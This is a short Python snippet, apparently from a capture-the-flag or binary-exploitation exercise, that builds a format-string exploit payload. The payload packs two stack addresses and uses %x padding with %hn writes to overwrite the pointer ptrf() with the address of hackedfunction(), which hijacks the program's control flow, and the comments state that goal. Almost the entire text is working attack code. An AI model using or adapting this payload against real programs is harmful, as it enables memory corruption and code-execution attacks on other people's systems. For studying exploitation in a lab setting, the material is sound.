#Payload that writes the desired bytes to mem address!
payload = b'\x9a\xd2\xff\xff\x98\xd2\xff\xff%2044x%2$hn%32544x%3$hn'
#need to write address of hackedfunction() (8048724) into address of
#ptrf() (ffffd2a8)
print(payload)
